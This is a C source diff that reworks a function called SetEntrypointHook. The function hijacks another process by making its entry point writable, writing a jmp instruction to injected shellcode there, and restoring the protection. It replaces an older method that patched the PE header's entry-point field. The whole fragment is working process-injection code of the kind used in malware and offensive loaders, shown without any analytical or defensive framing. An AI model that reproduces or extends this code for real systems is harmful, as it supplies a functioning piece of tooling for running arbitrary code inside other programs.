@@ -179,26 +179,22 @@ BOOL SetEntrypointHook(HANDLE hProcess) {
 		return FALSE;
 	}
 
-	// jmp shellcode
-	pShellcode[0] = 0xe9;
-	*(DWORD *)(pShellcode + 1) = (DWORD)pRemoteAddress - ((DWORD)peb.ImageBaseAddress + dwEntrypoint + 5);
-	WriteProcessMemory(hProcess, (PBYTE)peb.ImageBaseAddress + dwEntrypoint, pShellcode, 5, &written);
-
-	PBYTE pRemoteEntrypointAddress = (PBYTE)peb.ImageBaseAddress + ((PIMAGE_DOS_HEADER)pHeaderBuffer)->e_lfanew + 0x28;
-	if (!VirtualProtectEx(hProcess, pRemoteEntrypointAddress, sizeof(pRemoteAddress), PAGE_READWRITE, &dwOldProtect)) {
+	PVOID pRemoteEntrypoint = (PBYTE)peb.ImageBaseAddress + dwEntrypoint;
+	if (!VirtualProtectEx(hProcess, pRemoteEntrypoint, 5, PAGE_READWRITE, &dwOldProtect)) {
 		OutputDebugStringA("[-] Error changing entrypoint protection\n");
 		return FALSE;
 	}
 
-	pRemoteAddress = (PVOID)((DWORD)pRemoteAddress - (DWORD)peb.ImageBaseAddress);
-	if (!WriteProcessMemory(hProcess, pRemoteEntrypointAddress, &pRemoteAddress, sizeof(pRemoteAddress), &written)) {
-		OutputDebugStringA("[-] Error overwriting the entrypoint\n");
-		return FALSE;
-	}
-	if (!VirtualProtectEx(hProcess, pRemoteEntrypointAddress, sizeof(pRemoteAddress), dwOldProtect, &dwOldProtect)) {
+	// jmp shellcode
+	pShellcode[0] = 0xe9;
+	*(DWORD *)(pShellcode + 1) = (DWORD)pRemoteAddress - ((DWORD)peb.ImageBaseAddress + dwEntrypoint + 5);
+	WriteProcessMemory(hProcess, pRemoteEntrypoint, pShellcode, 5, &written);
+
+	if (!VirtualProtectEx(hProcess, pRemoteEntrypoint, 5, dwOldProtect, &dwOldProtect)) {
 		OutputDebugStringA("[-] Error resetting entrypoint protection\n");
 		return FALSE;
 	}
+
 	return TRUE;
 }
 
